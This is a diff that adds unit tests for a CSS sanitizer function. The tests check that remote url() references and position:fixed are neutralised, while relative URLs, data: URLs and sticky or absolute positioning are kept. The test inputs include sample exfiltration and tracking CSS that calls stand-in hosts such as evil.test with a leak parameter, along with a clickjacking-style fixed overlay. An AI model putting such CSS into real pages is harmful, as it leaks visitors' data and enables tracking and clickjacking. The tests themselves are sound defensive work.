@@ -29,4 +29,31 @@ describe("sanitizeCustomCss", () => {
     expect(sanitizeCustomCss(null)).toBe("");
     expect(sanitizeCustomCss("")).toBe("");
   });
+  it("blocks remote url() (exfil / pixel tracking)", () => {
+    const out = sanitizeCustomCss(
+      'a{background:url(https://evil.test/p?leak=1)} b{background:url("http://e.v/x")} c{background:url(//e.v/y)}',
+    ).toLowerCase();
+    expect(out).not.toContain("evil.test");
+    expect(out).not.toContain("http://e.v");
+    expect(out).not.toContain("//e.v");
+    expect(out).toContain("blocked");
+  });
+  it("keeps relative and data: url()", () => {
+    expect(sanitizeCustomCss("a{background:url(/img/bg.png)}")).toContain(
+      "url(/img/bg.png)",
+    );
+    expect(sanitizeCustomCss("a{background:url(data:image/png;base64,AAAA)}")).toContain(
+      "data:image/png",
+    );
+  });
+  it("neutralizes position:fixed (clickjack) but keeps sticky/absolute", () => {
+    expect(sanitizeCustomCss(".x{position:fixed;top:0}").toLowerCase()).not.toContain(
+      "position:fixed",
+    );
+    expect(sanitizeCustomCss(".x{position: fixed }").toLowerCase()).toContain(
+      "position:static",
+    );
+    expect(sanitizeCustomCss(".y{position:sticky}")).toContain("position:sticky");
+    expect(sanitizeCustomCss(".z{position:absolute}")).toContain("position:absolute");
+  });
 });
